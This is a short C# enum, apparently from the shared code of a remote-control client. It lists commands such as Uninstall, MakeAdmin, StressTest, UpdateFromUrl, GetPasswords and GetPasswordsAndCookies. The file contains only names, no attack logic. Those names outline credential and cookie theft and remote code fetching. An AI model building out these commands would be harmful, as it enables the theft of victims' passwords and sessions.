// ReSharper disable InconsistentNaming

namespace Orcus.Shared.Communication
{
    public enum ClientAction
    {
        Uninstall,
        MakeAdmin,
        Shutdown,
        Update,
        ReplaceUpdate,
        StressTest,
        ShutdownComputer,
        LogOffComputer,
        RestartComputer,
        ChangeWallpaper,
        OpenWebsite,
        UpdateFromUrl,
        UpdateFromUrlWithHash,
        GetPasswords,
        GetPasswordsAndCookies
    }
}